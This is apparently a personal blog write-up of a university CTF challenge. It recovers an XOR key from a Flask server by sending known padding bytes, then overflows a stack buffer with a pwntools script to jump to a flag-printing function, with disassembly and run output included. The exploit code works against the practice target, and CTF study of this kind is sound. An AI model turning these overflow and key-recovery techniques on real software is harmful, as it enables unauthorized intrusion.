---
title: "OSU League 2020/2021 - many_time_pad Writeup"
date: 2020-12-05
draft: false
description: ""
tags: ["ctf"]
---
For this challenge, we are giving a link to a web page.  Going to it, we are greeted with this:  
{{< figure src="/img/1-many.png" >}}


They also give us the source code for the web server:

```python
from app import app
from app import cfg
from flask import render_template,request,redirect,make_response,send_file

#serve index.html
@app.route("/")
def index():
    return render_template("index.html")

#encrypt messages that are POSTed to /encrypt
@app.route("/encrypt", methods=["POST"])
def encrypt():
    #truncate message if longer than 256 bytes, convert to byte string
    plaintext = request.form.get("message")[:256].encode()
    #pad message with \xff bytes
    plaintext += b'\xff' * (256 - len(plaintext))
    #xor byte string with secret key
    ciphertext = bytes([plaintext_byte ^ key_byte for plaintext_byte, key_byte in zip(plaintext, cfg.secret_byte_string)])
    #put the ciphertext in a response header
    resp = make_response(render_template("index.html"))
    resp.headers["ciphertext"] = repr(ciphertext)
    return resp

#send server source code to those who request it
@app.route("/source")
def source():
    return send_file("./views.py")

#secret admin page, the URL is the secret key so it is secure
@app.route("/" + cfg.secret_byte_string.decode())
def win():
    return(render_template("win.html"))
```

Looking though the source code, it looks like our goal is to find `secret_byte_string`, as that will tell us the path to the admin site.  We also see how the ciphertext is generated.  It's an XOR between each byte of the plaintext we provide with the secret key.  So with the properties of XOR, if we know the plaintext and the ciphertext that would be generated, we can find the secret key!

We see here that our plaintext gets padded with `\xff` to get to 256 bytes, so if we just don't input anything into the field box, then we know our plaintext is `\xff\xff\xff ... ` 256 times. So let's try that, and look at the response header we get from sending it.

{{< figure src="/img/2-many.png" >}}

Alright, looks like we have the ciphertext, now to just XOR it with our plaintext. Xoring and coverting to ascii we get out path:  
`if-you-tried-to-dirbuster-this-route-I-will-forward-you-the-OSUSEC-AWS-bill-never-gonna-give-you-up-never-gonna-let-you-down-never-gonna-run-around-and-desert-you-never-gonna-make-you-cry-never-gonna-say-goodbye-never-gonna-tell-a-lie-and-hurt-you-12345678`

We are then given a site with shows us how to set up our enviroment to do a pwn challenge along with a baby pwn to solve.  We are even given some skeleton code that we can use for the exploit.

Downloading the binary and disassembling it through gdb, we can immediatly see a vulnerability.  At `main+53`, we have a call to fgets, which would allow us to perform a buffer overflow attack.

```
gdb-peda$ disass main
Dump of assembler code for function main:
   0x000000000040071b <+0>:     push   rbp
   0x000000000040071c <+1>:     mov    rbp,rsp
   0x000000000040071f <+4>:     sub    rsp,0x10
   0x0000000000400723 <+8>:     mov    eax,0x0
   0x0000000000400728 <+13>:    call   0x400692 <check_the_key>
   0x000000000040072d <+18>:    test   eax,eax
   0x000000000040072f <+20>:    jne    0x40075c <main+65>
   0x0000000000400731 <+22>:    lea    rdi,[rip+0x108]        # 0x400840
   0x0000000000400738 <+29>:    call   0x400520 <puts@plt>
   0x000000000040073d <+34>:    mov    rdx,QWORD PTR [rip+0x20090c]        # 0x601050 <stdin@@GLIBC_2.2.5>
   0x0000000000400744 <+41>:    lea    rax,[rbp-0x10]
   0x0000000000400748 <+45>:    mov    esi,0x20
   0x000000000040074d <+50>:    mov    rdi,rax
   0x0000000000400750 <+53>:    call   0x400540 <fgets@plt>
   0x0000000000400755 <+58>:    mov    eax,0x0
   0x000000000040075a <+63>:    jmp    0x40075e <main+67>
   0x000000000040075c <+65>:    nop
   0x000000000040075d <+66>:    nop
   0x000000000040075e <+67>:    leave
   0x000000000040075f <+68>:    ret
End of assembler dump.
```

We can also open up the binary in Ghidra and see that the buffer we need to fill is 16 bytes long. Perfect, what can we do with this though?  Looking at the functions, we see something promising:

```
gdb-peda$ info functions

0x0000000000400647  print_the_flag
```

We also need to pass in our key we got from the web challenge portion to get to this point, so we need to remember to account for that.
So our current plan of attack sounds like:
1. Pass in our key
2. Fill the buffer up with 16 byte
3. Overwrite EBP with 8 bytes
4. Overwrite EIP with the address of `print_the_flag`
5. Win

In python, that looks like:

```python
from pwn import *
buffer_size = 16
addr_of_printflag_function = 0x0000000000400647
secret_key_string = "if-you-tried-to-dirbuster-this-route-I-will-forward-you-the-OSUSEC-AWS-bill-never-gonna-give-you-up-never-gonna-let-you-down-never-gonna-run-around-and-desert-you-never-gonna-make-you-cry-never-gonna-say-goodbye-never-gonna-tell-a-lie-and-hurt-you-12345678"

p = remote("ctf-league.osusec.org", 31309)

print(p.recv())

print("sending the key string: " + secret_key_string)
p.send(secret_key_string)
print("response: " + p.recv().decode())

payload = b'A' * buffer_size

payload += b'B' * 8

payload += p64(addr_of_printflag_function)
print(b"payload: " + payload)
p.send(payload)
```

And running it we get the flag!!!

```
cameron@LAPTOP-PEKGUHAN:/mnt/c/Users/Cameron McCawley/Desktop/mtp$ python2 exploit.py
[+] Opening connection to ctf-league.osusec.org on port 31309: Done
enter the secret key from the web portion of this challenge
sending the key string: if-you-tried-to-dirbuster-this-route-I-will-forward-you-the-OSUSEC-AWS-bill-never-gonna-give-you-up-never-gonna-let-you-down-never-gonna-run-around-and-desert-you-never-gonna-make-you-cry-never-gonna-say-goodbye-never-gonna-tell-a-lie-and-hurt-you-12345678
response:

payload: AAAAAAAAAAAAAAAABBBBBBBBG\x06\x00\x00\x00
[*] Switching to interactive mode
overflow my buffer and return to the print_the_flag function
osu{L0N6_W01f_H^x0r}
```
